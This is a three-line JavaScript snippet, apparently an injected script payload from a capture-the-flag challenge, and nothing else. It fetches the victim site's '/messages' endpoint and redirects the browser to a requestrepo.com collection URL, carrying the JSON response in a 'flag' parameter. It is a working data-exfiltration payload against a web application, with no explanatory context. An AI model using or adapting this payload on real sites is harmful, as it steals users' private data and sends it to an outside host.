fetch('/messages')
  .then(r => r.json())
  .then(d => window.location = 'https://ntqibotq.requestrepo.com/log?flag=' + encodeURIComponent(JSON.stringify(d)));
